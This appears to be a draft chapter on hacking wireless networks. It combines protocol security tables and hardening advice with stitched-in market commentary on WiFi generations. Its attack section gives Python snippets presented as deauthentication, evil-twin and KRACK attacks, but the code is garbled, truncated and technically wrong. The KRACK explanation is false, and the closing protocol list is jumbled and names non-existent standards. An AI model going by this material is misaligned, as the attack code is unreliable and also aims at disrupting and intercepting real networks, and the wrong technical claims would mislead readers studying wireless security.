\chapter{Hacking Wireless Networks}
\section{Introduction to Wireless Networking}
	The IEEE 802.1x Standard
	Types of Wireless Attacks
	Wireless Network Basics
	Components of Wireless Networks
	Setting Up Wireless Local Area Networks (WLANs)
	Detecting and Scanning for Wireless Network WAPs
	How to Access a WLAN
	Advantages and Disadvantages of Wireless Network Setups and Configurations
	Wireless Antennas
	SSIDs
	Access Point (AP) Positioning
	Wireless Leakage
	Rogue Access Points
	Wireless Network Protocols
		Current and Deprecated / Legacy WLAN Protocols
		Current:
			IEEE 802.11ax (WiFi 6 and WiFi 6E)
			IEEE 802.11ac (WiFi 5)
			IEEE 802.11n
			IEEE 802.11ax Lite / Variants
			IEEE 802.11ah (WiFi HaLow)
			IEEE 802.11r / 802.11k / 802.11v		
Deprecated:
			IEEE 802.11 (Original) - 1997 Standard
			IEEE 802.11a
			IEEE 802.11b
			IEEE 802.11g
		Vulnerable and Risky WLAN Protocols and Configurations
			Encryption and Authentication Protocols
				WEP (Wired Equivalent Privacy)
				WPA (WiFi Protected Access) with TKIP
				WPA2 with TKIP
				WPA2 without Protected Management Frames (PMF)
				WPA3-SAE (Simultaneous Authentication of Equals)
		Protocol-Specific Vulnerabilities
			IEEE 802.11b/g (Legacy 2.4 GHz bands)
			IEEE 802.11n
			IEEE 802.11ac / IEEE 802.11ax
			IEEE 802.11ad/ay (60 GHz band)
			IEEE 802.11ah (WiFi HaLow)

Hacking Wireless Networks

Protocols and Their Vulnerability Levels

Protocol/Standard	Usage Status	Security Level/Vulnerability Summary
WEP			Deprecated	Highly vulnerable; should never be used
WPA (TKIP)		Deprecated	Vulnerable; weak encryption, deprecated
WPA2 + TKIP		Limited use	Vulnerable if TKIP is used
WPA2 + AES		Very common	Strong security when used with PMF
WPA3			Increased use	Current best practice; mitigates many WPA2 vulnerabilities
IEEE 802.11b/g		Legacy		Vulnerable if using WEP/TKIP; 2.4 GHz interference issues
IEEE 802.11n		Widespread	Vulnerable only if configured insecurely
IEEE 802.11ac (WiFi 5)	Current standard	Secure with WPA2/WPA3; maintain updates to avoid exploits
IEEE 802.11ax (WiFi 6)	Newest common		Secure with WPA3, still maturing but considered strong
IEEE 802.11ah (WiFi HaLow)	Emerging	Security depends on implementation; WPA3 support planned
IEEE 802.11 ad/ay	Niche, short-range	Security depends on implementation; limited large-scale use

-------------------------------------------------------------------------------

*Additional Notes on Common Attacks vs. Protocols

* Deauthentication/Disassociation Attacks:
	Possible on almost all WiFi standards below WPA3 if PMF is not enabled.
* KRACK Attack:
	Affects WPA2s 4-way handshake. Patched in modern firmware/software	
* Dictionary Attacks on PSK:
	Any PSK-based authentication is vulnerable to offline dictionary and brute-force if the passphrase is weak
* Management Frame Injection:
	Controls deauth, disassoc frames-protected in WPA3 with PMF but vulnerable in older WPA2 or WPA

-------------------------------------------------------------------------------

*Comprehensive Guide to Understanding and Securing Contemporary WLAN Protocols

1. Understanding WLAN Protocols in Modern Networks
WiFi technology has evolved to meet growing demands for faster speeds, lower latency, greater device density, and improved security. The widely adopted standards today consist mainly of:

* WiFi 6 (IEEE 802.11ax):
Introduced higher throughput, OFDMA (Orthogonal Frequency-Division Multiple Access) for better spectrum efficiency, and improved power-saving features making it ideal for dense environments like stadiums or IoT-heavy networks. WiFi 6 incorporates support for WPA3 by default, which enhances security with stronger encryption and improved protection against password guessing.

* WiFi 5 (IEEE 802.11ac):
Predominantly 5 GHz operation with higher channel bandwidths (up to 160 MHz), supporting multi-user MIMO (MU-MIMO) for simultaneous device communication. Very common in homes and offices but less secure if older WPA2 configurations are used.

* WiFi 4 (IEEE 802.11n):
Operates on both 2.4 GHz and 5 GHz, an important transitional standard supporting MIMO and higher data rates than previous versions. Older deployments may still use it, but security relies heavily on how it has been configured.

* WiFi HaLow (IEEE 802.11ah):
Designed for IoT ecosystems demanding long-range, low power consumption, particularly where traditional WiFi struggles due to obstructed environments and power constraints.

2. Security Landscape: Protocols and Encryption
At the heart of WLAN security lies encryption and authentication technologies. These can be summarized as:

* WEP (Wired Equivalent Privacy):
Obsolete and dangerously insecure. Vulnerable to trivial cracking through offline attacks. Avoid entirely.

* WPA (WiFi Protected Access) and WPA2:
WPA was an interim solution to WEPs weaknesses, improved with TKIP (Temporal Key Integrity Protocol) but still vulnerable by today's standards.

WPA2 specifically with AES (CCMP mode) remains widely deployed and secure if properly configured. The major vulnerabilities that affected WPA2— most notably the KRACK attacks— have been patched in current devices.

* WPA3:
The latest standard, designed to close gaps present in WPA2—including mandatory Protected Management Frames (PMF) and a more robust handshake protocol that mitigates offline dictionary attacks.

3. Practical Steps to Secure Your WLAN

* Upgrade to WPA3 (or at least WPA2 with AES):
Configuring access points to force WPA3 or WPA2 with AES is critical. Avoid TKIP configurations entirely.

* Use Strong Passphrases or Enterprise Authentication:
Password strength dramatically impacts security for WPA-Personal networks. For businesses, WPA2/WPA3-Enterprise with RADIUS authentication affords significantly higher security.

* Enable Protected Management Frames (PMF):
PMF protects management frames such as deauthentication and disassociation frames from spoofing and injection attacks.

* Keep Firmware and Drivers Updated:
Regularly update all client and AP software to patch vulnerabilities such as KRACK and chipset-specific issues.

* Disable Legacy Protocols (WEP, WPA TKIP):
This minimizes attack surface and forces clients to use stronger encryption.

* Segment and Monitor Networks:
Use VLANs, guest networks, and network monitoring tools to segregate traffic and detect anomalous behavior.

* Employ Wireless Intrusion Detection Systems (WIDS):
These systems can detect rogue APs, deauth attacks, and other suspicious wireless activity.

4. Common Attacks to Watch For
* Deauthentication Attacks:
Disrupt user experience and facilitate handshake capture.

* Handshake Capture + Offline Cracking:
Targeting weak passwords through dictionary or brute force attacks.

* Rogue AP / Evil Twin:
Usurps legitimate AP identity to intercept data or launch man-in-the-middle attacks.

* KRACK and Implementation Vulnerabilities:
Attacks on the WPA2 handshake exploiting retransmission vulnerabilities.

These threats reinforce why the combination of robust protocols, secure configurations, and monitoring is essential.

5. Future Outlook
* WiFi 7 (IEEE 802.11be):
Promises further speed, reliability, and enhanced security, expected to become the new mainstream in the near future.

* Greater IoT Integration:
Emerging standards and protocol extensions will focus on ensuring secure mass deployments of IoT devices, leveraging technologies like WiFi HaLow.

-------------------------------------------------------------------------------

* Wireless Network Attacks

* 1. Deauthentication Attack

This attack involves sending deauthentication packets to disconnect legitimate clients from an access point. The attacker can then reconnect to the access point with the same credentials and potentially launch further attacks. An example of the attack in Python would look similar to this script:

\begin{verbatim}
\texttt{\# python}

\texttt{import socket}
def deauth_client(bssid, channel):
    # create a socket object
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x00003))
    # get the MAC address of the target access point
    ap_mac = socket.ether_aton('00:00:00:00:00:00')
    # create a deauthentication packet
    deauth_packet = bytearray(len(ap_mac) + 1 + 6)
    deauth_packet[0] = 0x8c
    deauth_packet[0] = 0x8c
    deauth_packet[1] = 0x00
    deauth_packet[2] = 0x00
    deauth_packet[3] = 0x00
    deauth_packet[4] = 0x00
    deauth_packet[5] = 0x00
    for i in range(6):
        deauth_packet[6+i] = ap_mac[i]
    # send the deauthentication packet
\end{verbatim}
\texttt{s.sendto(deauth\_packet, (bssid, channel))}

\texttt{s.sendto(deauth\_packet, (bssid, channel))}




  \texttt{s.close()}
2. Man-in-the-Middle   (MITM) Attack

This attack involves positioning yourself between two communicating parties (in this case, a client and an access point) to intercept and modify data being transmitted. Here's an example Python code snippet:

\begin{verbatim}
python

import socket
def mitm_attack(bssid, channel):
    # create a socket object
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x00003))
    # get the MAC address of the target access point
    ap_mac = socket.ether_aton('00:00:00:00:00:00')
    # create a packet to deauthenticate the client
    deauth_packet = bytearray(len(ap_mac) + 1 + 6)
    deauth_packet[0] = 0x8c
    deauth_packet[5] = 0x00
    for i in range(6):
        deauth_packet[6+i] = ap_mac[i]
    # send the deauthentication packet
    s.sendto(deauth_packet, (bssid, channel))
    # create a new access point with the same SSID as the original
    ssid = 'attacked_network'
    ap_mac = '00:00:00:00:00:00'
    ap_packet = bytearray(len(ssid) + 1 + 6)
    ap_packet[0] = 0x00
    ap_packet[1] = 0x00
    ap_packet[2] = 0x00
    ap_packet[3] = 0x00
    ap_packet[4] = 0x00
    ap_packet[5] = 0x00
    for i in range(6):
        ap_packet[6+i] = ssid[i]
    ap_packet[12] = 0x02
    ap_packet[13] = 0x00
    ap_packet[14] = 0x00
    ap_packet[15] = 0x00
    # send the access point packet
    s.sendto(ap_packet, (bssid, channel))
    # create a new socket to communicate with the

    deauth_packet[1] = 0x00
    deauth_packet[2] = 0x00
    deauth_packet[3] = 0x00
    \texttt{deauth_packet[4] = 0x00}

* 3 KRACK Attack
Python code demonstrating a WiFi KRACK Attack:

```
python

def krack_attack(bssid, channel):
    # create a socket object
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x00003))
    # get the MAC address of the target access point
    ap_mac = socket.ether_aton('00:00:00:00:00:00')
    # create a replay packet
    replay_packet = bytearray(len(ap_mac) + 1 + 6)
    replay_packet[0] = 0x88
    replay_packet[1] = 0x8E
    replay_packet[2] = 0x08
    replay_packet[3] = 0x00
    replay_packet[4] = 0x00
    replay_packet[5] = 0x00
    for i in range(6):
        replay_packet[6+i] = ap_mac[i]
    # send the replay packet
    s.sendto(replay_packet, (bssid, channel))
    # create a new socket to communicate with the target client
```
The KRACK Attack exploits a vulnerability in the 4-way handshake process used by WPA2-protected WiFi networks. During this process, the client and access point exchange nonce values to ensure message authenticity. The attacker can intercept (e.g., MiTM attack) and modify these nonce values to force the client and access point into an infinite loop, allowing the attacker to decrypt and inject data into the communications channel.

The code above creates a replay packet using the MAC address of an access point and sends it to the target access point. This triggers the KRACK Attack, forcing the client and access point into the infinite loop. The attacker can then use this loop to inject and manipulate data being transmitted between the client and the access point.

-------------------------------------------------------------------------------

* Wireless Protocol Formation

WiFi protocols define the different generations of WiFi technology, with each new iteration bringing more advanced features, better performance, and improved security. Think of these protocols as updates that help wireless networks keep up with the increasing demands of modern devices and connected environments. Whether it’s providing faster speeds, supporting more devices at once, or enhancing security, every new WiFi standard aims to improve your overall wireless experience.

The development of these standards is driven by the Institute of Electrical and Electronics Engineers (IEEE), a global professional organization dedicated to advancing technology for the benefit of humanity. The IEEE sets technical standards in many areas of electronics and communications, including WiFi. Specifically,the IEEE 802.11 working group is responsible for developing the core WiFi specifications—everything from how signals are transmitted to how devices share airtime.

Alongside the IEEE’s technical standardization efforts, the WiFi Alliance acts as the industry’s quality gatekeeper. This global consortium of major technology companies—including Apple, Intel, Cisco, and others—runs the WiFi certification program, which ensures devices are interoperable, secure, and meet agreed-upon minimum requirements. This certification process helps guarantee that a WiFi product won’t just work on paper, but will perform reliably in the real world alongside equipment from different manufacturers.

Security is a major part of WiFi's evolution, and that’s where standards like IEEE 802.1X come into play. IEEE 802.1X is a network access control protocol that provides an authentication framework for devices trying to connect to a wired or wireless network. It essentially acts as a gatekeeper, verifying a user or device’s credentials before granting access to the network. This protocol is widely used in enterprise WiFi networks to ensure only authorized devices can connect, adding an important layer of security beyond just encryption.

When a manufacturer submits a device for certification under a current WiFi standard—say, WiFi 6 (802.11ax)—the WiFi Alliance runs it through rigorous testing to confirm it supports key technologies such as:

	> Orthogonal Frequency Division Multiple Access (OFDMA): This technique divides wireless channels into smaller sub-channels that multiple devices can use simultaneously, reducing wait times and improving efficiency in crowded networks.

	> Multi-User Multiple Input, Multiple Output (MU-MIMO): This lets routers communicate with several devices at once rather than sequentially, boosting overall data throughput and reducing lag.

	> 1024 Quadrature Amplitude Modulation (1024-QAM): An advanced modulation method that increases the amount of data sent in each signal, resulting in faster speeds.

	> WPA3 Security Protocol: The latest WiFi encryption standard that complements protocols like 802.1X with stronger protection against unauthorized access and eavesdropping.

If a device falls short of these requirements, it won’t receive the official WiFi certification. This “seal of approval” is important because it gives consumers peace of mind that their devices will work well within the broader WiFi ecosystem and that the manufacturer stands behind the product’s performance and security.

It’s also worth noting that WiFi standards often roll out in phases, sometimes called “waves.” For example, WiFi 6 started with “Wave 1,” which had a core set of features, and later expanded with “Wave 2,” which added enhancements and new capabilities. Devices introduced at different waves typically need to undergo new rounds of certification to ensure they meet the latest performance and compatibility standards.

Timeline Infographic: Evolution of WiFi Protocols

This detailed infographic provides a comprehensive overview of the progression of WiFi protocols, tracing their development from the initial release of the 802.11 standard in 1997 to the most advanced versions available today. Each major update in WiFi technology is showcased along a timeline, highlighting key improvements in speed, range, security, and overall performance that have driven wireless connectivity forward over the years. From the early days of basic wireless networking to the introduction of high-throughput standards like 802.11n, 802.11ac, and the latest WiFi 6 (802.11ax) and WiFi 7 developments, this visual guide captures the innovations that have transformed how devices connect to the internet worldwide. Whether you are a tech enthusiast, a networking professional, or simply curious about how WiFi technology has evolved, this infographic offers an informative look at the milestones shaping wireless communication.

<img src="https://www.abiresearch.com/hubfs/Imported_Blog_Media/infographic-timeline-wifi-protocols-explained-1-1.png" alt="Infographic explaining each WiFi protocol as they have released over the years. Starting with the formation of Wi-Fi (802.11) back in 1997."/>

**Legacy WiFi Protocols Still Present in New Products: An In-Depth Overview**

Despite rapid advancements in wireless networking technology, some legacy WiFi protocols continue to appear in new products, albeit at declining rates. Two of the most notable protocols that still find a place in today’s market are WiFi 4 (802.11n) and WiFi 5 (802.11ac). Understanding their current relevance, applications, and future trajectory provides valuable insight into the evolving wireless ecosystem.


 WiFi 4 (802.11n) – The Oldest Protocol Still in Use

Introduced in 2009, WiFi 4 (802.11n) is the oldest WiFi standard still incorporated into new devices, albeit only on a very limited scale. Originally, this protocol played a pivotal role in enabling early Internet of Things (IoT) devices, largely due to its balance of low cost, low power consumption, and adequate performance for simple connectivity needs. Its design primarily leveraged the 2.4 GHz frequency band, which remains popular for low-data-rate IoT applications given its relatively long range and better wall penetration compared to 5 GHz signals.

However, despite its early success, WiFi 4 has not evolved significantly to support the growing demands of modern IoT environments or high-performance networking. Its maximum theoretical throughput tops out at 600 Megabits per second (Mbps), but real-world speeds above 125 Mbps are uncommon due to channel conditions, interference, and device limitations. As IoT devices increasingly favor specialized protocols optimized for ultra-low power consumption (such as Zigbee, Thread, or Bluetooth Low Energy), WiFi 4’s role in this sector has diminished significantly.

Currently, WiFi 4 Access Point (AP) shipments primarily target cost-sensitive markets across Africa and Asia. In these regions, affordability often trumps cutting-edge performance, sustaining demand for legacy equipment. Even moving forward to 2026 and beyond, it is expected that some entry-level IoT devices and budget consumer products will continue to feature WiFi 4 connectivity. Nonetheless, its use will remain marginal compared to newer standards, as users and manufacturers progressively prioritize speed, security, and advanced features.


 WiFi 5 (802.11ac) – A Major Step Forward with Continued Market Significance

Certified by the WiFi Alliance in 2013, WiFi 5 (802.11ac) represented a significant leap over WiFi 4, particularly by fully embracing the 5 GHz frequency band. This transition allowed WiFi 5 to take advantage of less congested, wider, and cleaner channels, enabling vastly improved network throughput and reduced interference. Early iterations of WiFi 5 offered a theoretical maximum speed of around 1.2 Gigabits per second (Gbps), already a remarkable improvement for many wireless applications.

Over time, WiFi 5 underwent several enhancements. Key upgrades included increasing channel widths from 80 MHz to 160 MHz and expanding the use of Multiple Input, Multiple Output (MIMO) technology—boosting spatial streams from three to as many as eight. These technical advancements propelled the maximum theoretical throughput to an impressive 6.92 Gbps under ideal conditions, positioning WiFi 5 as a robust solution for bandwidth-intensive uses such as HD video streaming, online gaming, and enterprise networks.

Another significant advantage of WiFi 5 is its backward compatibility with WiFi 4, enabling devices and networks to maintain interoperability across different generations without disrupting connectivity. This compatibility has ensured WiFi 5’s broad adoption across a wide spectrum of devices, including smartphones, laptops, and customer premise equipment (CPE) like routers and gateways.

In 2022, WiFi 5 still accounted for approximately 42% of chipset shipments, largely supported by the ongoing presence of Wi-Fi 5 in consumer and commercial CPE. However, the market landscape is shifting rapidly. The emergence of Wi-Fi 6 (802.11ax) and the even more recent Wi-Fi 6E, with their improved efficiencies, support for denser device environments, and ability to operate in the 6 GHz band, are accelerating the decline of Wi-Fi 5’s dominance.

Looking ahead to 2026, industry forecasts project that Wi-Fi 5-equipped CPE will constitute only about 5% of shipments. Moreover, Wi-Fi 6 chipsets have already surpassed Wi-Fi 5 in market share for consumer smartphones and laptops, indicating a faster transition among end-user devices. This trend underscores the increasing demand for faster, more secure, and power-efficient wireless technologies tailored to modern digital lifestyles.


 Summary and Future Outlook

While legacy Wi-Fi protocols like Wi-Fi 4 and Wi-Fi 5 still exist in new market offerings, their presence is increasingly niche and transitional. Wi-Fi 4 remains in use mostly within cost-sensitive and basic IoT applications but lacks the performance and spectral advancements needed for many current networking demands. Wi-Fi 5, once a game-changer for wireless speeds and reliability, is being phased out in favor of more advanced standards such as Wi-Fi 6 and Wi-Fi 7, which offer greater throughput, lower latency, and better handling of crowded networks.

Manufacturers and consumers alike are gravitating toward next-generation Wi-Fi technologies that provide enhanced user experiences and are optimized for the growing number of connected devices. Consequently, the legacy protocols, while still supported for backward compatibility and niche use cases, will steadily diminish in prevalence over the next few years.


 Key Technical Specifications Recap:

| Protocol | Year Certified | Frequency Bands | Max Theoretical Throughput | Channel Width | Spatial Streams | Typical Use Cases || --- | --- | --- | --- | --- | --- | --- |
| Wi-Fi 4 (802.11n) | 2009 | 2.4 GHz (main), some support

t for 5 GHz | 600 Mbps | Up to 40 MHz | Up to 4 streams | Low-cost IoT, budget consumer devices |
| Wi-Fi 5 (802.11ac) | 2013 | 5 GHz | 1.2 Gbps initially, up to 6.92 Gbps | 80-160 MHz | 3 to 8 streams | High-performance consumer devices, CPE |


<img src="https://www.abiresearch.com/hubfs/Imported_Blog_Media/image-20221005084706-1-1-1.png"/>

 The Exciting Features and Future Potential of the WiFi 7 Standard

The WiFi 7 standard, officially recognized as IEEE 802.11be, is poised to be a groundbreaking advancement in wireless networking, with certifications expected as early as 2024. This next-generation WiFi protocol is set to dramatically expand the capabilities of tri-band networks, particularly by making extensive use of the 6 GHz spectrum, which was introduced with WiFi 6E but will be fully leveraged and optimized in WiFi 7.

Pioneering Technological Innovations in WiFi 7

WiFi 7 introduces a suite of technological advancements that elevate wireless performance to unprecedented levels. One of the most notable features is **Multi-Link Operation (MLO)**, which enables devices to simultaneously utilize multiple radio links across different frequency bands (2.4 GHz, 5 GHz, and 6 GHz). By aggregating bandwidth from these diverse bands, MLO reduces latency, increases throughput, and enhances the overall robustness of wireless connections—even in congested environments.

In addition to MLO, WiFi 7 supports **preamble puncturing**, a technique that allows devices to skip over portions of a channel that are occupied by interference or other users. This results in more efficient spectrum utilization and improves network performance in real-world, noisy radio environments. WiFi 7 also brings **4K Quadrature Amplitude Modulation (4K QAM)**, which significantly increases data rates by encoding more bits per symbol compared to WiFi 6’s 1024-QAM.

Massive Bandwidth and Speed Enhancements

The standard supports **channel widths up to 320 MHz**, doubling that of WiFi 6E’s top channel width of 160 MHz. This wider channel bandwidth allows WiFi 7 devices to theoretically achieve speeds of **up to 46.4 Gbps**, a substantial leap forward that dramatically outpaces all previous WiFi generations. For typical consumer devices employing standard 2x2 MIMO configurations, the theoretical throughput reaches **5.8 Gbps**, which is more than twice the theoretical maximum speeds of WiFi 6 and WiFi 6E systems.

Such tremendous increases in throughput and spectral efficiency have profound implications for bandwidth-intensive, latency-sensitive applications. WiFi 7 is ideally suited for **ultra-high-definition 8K video streaming**, **Augmented Reality (AR)** and **Virtual Reality (VR)** immersive experiences, and **cloud-based gaming**, all of which demand seamless, real-time data transmission. This makes WiFi 7 a key enabler for the next frontier of digital lifestyle enhancements both at home and in enterprise settings.

Industry Momentum and Early Market Adoption

Even before full certification in 2024, WiFi 7 has been stirring considerable interest and momentum in the industry. At Mobile World Congress 2022, Qualcomm introduced its FastConnect 7800 chipset—the world’s first WiFi 7 chipset boasting a remarkable latency as low as **2 milliseconds**. This breakthrough low-latency performance is critical for real-time applications such as competitive gaming and interactive AR experiences.

Shortly thereafter, Broadcom announced its WiFi 7-optimized residential access point chipsets, the BCM67263 and BCM6726, signaling readiness for mass-market consumer adoption. These early announcements highlight a familiar pattern observed with prior WiFi generations, where draft-compliant products appear on the market well before official certification, allowing manufacturers and consumers to start adopting new technologies earlier.

Market forecasts from ABI Research anticipate strong growth in WiFi 7 chipset shipments: approximately **16 million units by the end of 2022**, increasing to **58 million in 2023**, and soaring to an estimated **545.2 million units by 2026** globally. These figures underscore the rapidly growing demand and mainstreaming of WiFi 7 technology.

Strategic Recommendations for Retailers and Manufacturers

Given this accelerating adoption curve, premium retailers and manufacturers are strongly advised to expedite the development and production of WiFi 7-compatible routers and mesh networking systems. With consumer demand expected to spike swiftly once certified devices become widely available, early movers stand to capture a significant share of this burgeoning market.

While WiFi 7 will predominantly leverage the tri-band configuration (2.4 GHz, 5 GHz, and 6 GHz), it's important to note that around 10\% of all WiFi 7 chipsets through at least 2026 will remain dual-band**. This is primarily due to regulatory limitations on the 6 GHz spectrum in regions such as Mainland China, where this frequency band remains restricted or unavailable for unlicensed WiFi use.

For customers in these markets, investing in the additional 6 GHz radio hardware may not be economically justifiable, given the lack of spectrum access. Consequently, Original Equipment Manufacturers (OEMs) will need to offer dual-band WiFi 7 routers that maximize performance using the 2.4 GHz and 5 GHz bands, incorporating many of the new standard’s advanced technical features without the 6 GHz component.

This nuanced regional landscape implies that manufacturers aiming for global reach must tailor their product portfolios accordingly, balancing cost, complexity, and regulatory compliance while still delivering the cutting-edge benefits of WiFi 7.

Looking Ahead: The Future of Wireless Networking

In conclusion, WiFi 7 promises to be one of the most transformative WiFi standards to date, delivering revolutionary improvements in speed, latency, and multi-band efficiency. By breaking traditional barriers in spectrum utilization and incorporating advanced modulation and multi-link techniques, WiFi 7 will unlock new possibilities for high-performance wireless connectivity in homes, offices, and public spaces.

As we approach 2026 certification milestones and beyond, stakeholders across the technology ecosystem—from chipset manufacturers and device vendors to network operators and end users—should prepare for the coming wave of WiFi 7 innovations that will redefine wireless experiences across a broad spectrum of use cases in the years ahead.

In conclusion, legacy WiFi protocols continue to linger in new devices and networks, but their days of dominance are clearly numbered. The ongoing evolution of wireless standards promises faster speeds, better connectivity, and greater efficiency to meet the demands of an increasingly connected world.

In summary, WiFi protocols are the technical foundation that shapes how wireless networks grow and improve over time. The IEEE ensures these standards are well-designed and technically sound, including essential elements like the 802.1X security framework. The WiFi Alliance then makes sure devices meet these standards in practice, providing certification that protects users’ experience and security. So, when you see “WiFi Certified” on a product, it means it has passed a thorough vetting process and is ready to deliver the reliable, secure wireless connectivity we expect today.


**What Is WiFi HaLow?**

WiFi HaLow is an innovative wireless networking technology designed to extend the range and efficiency of traditional WiFi by operating in the sub-1 GHz unlicensed spectrum band. Unlike conventional WiFi networks, which typically function in the crowded 2.4 GHz or 5 GHz frequency bands, WiFi HaLow uses lower frequencies (below 1 GHz). This shift in operating frequency provides several distinct advantages, primarily involving range, penetration, and energy efficiency.

One of the most remarkable features of WiFi HaLow is its significantly expanded coverage area. Its effective range can be up to ten times greater than that of typical WiFi networks, enabling reliable connectivity over large distances. For example, WiFi HaLow can maintain a maximum data transfer rate of up to 86.7 Megabits per second (Mbps) at short distances. Even when devices are positioned as far as 1 kilometer away from the access point (AP), the connection can still deliver around 150 Kilobits per second (Kbps), which is quite significant for low-power Internet of Things (IoT) applications.

Long-range, low-power operation makes WiFi HaLow especially well-suited for battery-operated IoT devices such as sensors, meters, and security cameras. Its ability to operate on the less congested sub-1 GHz spectrum means it avoids interference from the heavily used 2.4 GHz band, which is shared by many household electronics, Bluetooth devices, and other WiFi networks. Additionally, signals in the lower frequency band penetrate walls, floors, and other physical obstacles much more effectively than higher frequency bands, improving indoor and outdoor connectivity in complex environments like warehouses, farms, industrial plants, or smart cities.

Another key benefit of WiFi HaLow is its scalability in device connectivity. A single WiFi HaLow access point can support upwards of 8,000 devices simultaneously, which is a game-changer for dense IoT deployments. This capacity far exceeds the number of devices supported by traditional WiFi networks, making it ideal for applications ranging from smart agriculture and logistics to home automation and smart metering.

**Adoption and Market Penetration**

Despite its promising capabilities, WiFi HaLow has had a relatively slow path to widespread adoption. The technology has been available for more than five years, but it was only officially certified by the WiFi Alliance, the global network of companies that sets standards for WiFi interoperability, in November 2021. Certification helped validate the standard and encouraged device manufacturers and network providers to consider integrating it into their products and services.

However, WiFi HaLow has yet to make significant inroads into mass consumer markets. One major reason is the absence of WiFi HaLow support in common consumer wireless routers and residential gateways. Without native support from these networking hubs, device makers have been hesitant to adopt WiFi HaLow for a broad range of consumer IoT products like smart cameras, thermostats, and environmental sensors because they rely on standard WiFi connectivity for compatibility and ease of use.

In this landscape, Australian semiconductor company Morse Micro has emerged as a key player championing WiFi HaLow adoption. Morse Micro has been collaborating closely with internet service providers (ISPs) and hardware manufacturers to integrate WiFi HaLow into consumer wireless infrastructure and promote its practical usage. Their efforts focus on building an ecosystem that can support WiFi HaLow-enabled devices natively, helping bridge the gap between the technology's capabilities and real-world consumer deployment.

**Competing Technologies and Practical Use Cases**

Alongside WiFi HaLow, other wireless technologies have evolved to serve battery-operated IoT and long-range connectivity needs. For example, Wi-Fi 6 introduced Target Wake Time (TWT), which helps extend the battery life of connected devices by scheduling when devices wake up to transmit data. While TWT improves power efficiency within traditional WiFi frequency bands, it does not offer the same extended range or penetration capabilities that Wi-Fi HaLow provides.

In residential and rural settings, WiFi HaLow’s long-range potential makes it particularly valuable where cellular coverage is weak or unavailable, or where cellular data costs are prohibitive. It can serve as a replacement or complement to cellular connectivity for devices located far from the main home or infrastructure—such as barns, guest houses, or garden outbuildings—offering high-data-rate connections over hundreds of meters to kilometers without needing expensive infrastructure upgrades.

**In Summary**

WiFi HaLow represents a powerful evolution in wireless technology by leveraging the sub-1 GHz spectrum to deliver extensive range, improved penetration, energy efficiency, and the capacity to connect thousands of devices. Its strengths lie particularly in long-range IoT applications in agriculture, smart homes, industrial environments, and rural settings. Still, adoption barriers, including limited integration into existing consumer networking hardware and competition from other emerging technologies, have slowed its spread in everyday consumer devices. Nonetheless, ongoing efforts by companies like Morse Micro and continued industry collaboration suggest that WiFi HaLow has the potential to become an important technology for future wireless connectivity needs, especially where long range and low power consumption are critical.
-------------------------------------------------------------------------------
-------------------------------------------------------------------------------
Note Current:
			
	IEEE 802.11r (Fast Roaming / Fast BSS Transmission)) / 802.11k / 802.11v - Management and roaming improvements present in many enterprise environments
	IEEE 802.11ah (WiFi HaLow) - Specialized for IoT with extended range and low power; Adoption is limited but growing for IoT expansion
	IEEE 802.11ax Lite / Variants - Emerging low-power, IoT-focused extensions; Not yet widely deployed but in the early adoption phase
	IEEE 802.11n - Very common in legacy standard but still widely deployed due to broad device support; Operates on 2.4 GHz and 5 GHz; Supports WPA2; however, older implementations sometimes use TKIP (less secure)
	IEEE 802.11ax (WiFi 6) - Widely adopted in newer devices and wireless infrastructure; Offers improved throughput, efficiency, and security enhancements (supports WPA3); Operates on 2.4 GHz, 5 GHz, and 6 GHz (WiFi 6E)
	IEEE 802.11ax (WiFi 6E) - Extension of WiFi 6 into 6 GHz band
	IEEE 802.11be (WiFi 7) - Emerging Standard, currently being adopted
	IEEE 802.11ac (WiFi 5) - Common in today's routers, laptops, smartphones; Operates primarily on the 5 GHz band; Supports WPA2 security; some devices support WPA3
	IEEE 802.11ad (Multi Use Tool: THC-RUT Tool: WinPcap Auditing Tool: bsd-airtools WIDZ- Wireless Detection Intrusion System Securing Wireless Networks Out of the box Security Radius: Used as Additional layer in security Maximum Security: Add VPN to Wireless LAN) - 60 GHz band, very high Throughput, short range
	IEEE 802.11ay - Enhancement of 802.11ad for higher Throughput and range
	IEEE 802.11ah (WiFi HaLow)
	IEEE 802.11zx Lite (proposed low-power version of 802.11ax)
	IEEE 802.11ba (Wake-Up Radio) - Low-power signaling for IoT devices
	IEEE 802.11.az (Next Generation Positioning)
	IEEE 802.11ai (Fast Initial Link Setup, FILS)
	IEEE 802.11zx Operation in 5 GHz and 2.4 GHz bands						
-------------------------------------------------------------------------------		












